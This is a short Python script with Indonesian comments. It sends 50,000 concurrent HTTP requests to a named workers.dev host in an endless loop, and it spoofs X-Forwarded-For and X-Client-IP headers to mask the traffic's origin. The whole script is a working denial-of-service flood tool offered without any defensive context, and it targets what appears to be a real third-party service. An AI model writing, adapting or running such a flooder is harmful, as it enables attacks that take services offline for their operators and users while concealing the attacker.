import aiohttp
import asyncio

# Konfigurasi IP palsu
fake_ip_range = '28.0.0.1/8'
fake_ip_filter = ['*.lan', '*.local']
nameserver = ['1.1.1.1']

# Buat kustom header dengan alamat IP palsu
custom_headers = {
    'X-Forwarded-For': fake_ip_range,
    'X-Client-IP': fake_ip_range,
    'Host': 'sxtcp.tg-index.workers.dev'  # Ganti dengan host yang sesuai
}

async def send_request(url):
    try:
        async with aiohttp.ClientSession(headers=custom_headers) as session:
            async with session.get(url) as response:
                response_text = await response.text()
                return response_text
    except Exception as e:
        return None

async def main():
    default_url = 'https://sxtcp.tg-index.workers.dev'  # URL default
    num_requests = 50000  # Jumlah permintaan yang ingin Anda kirim

    while True:
        # Inisialisasi list untuk menyimpan hasil respons
        responses = []

        # Buat daftar 10 tugas untuk mengirim permintaan
        tasks = [send_request(default_url) for _ in range(num_requests)]

        # Jalankan tugas-tugas secara bersamaan
        responses = await asyncio.gather(*tasks)

        # Handle hasil respons di sini
        for response in responses:
            if response is not None:
                print('Success')
            else:
                print('Failed')

if __name__ == "__main__":
    asyncio.run(main())
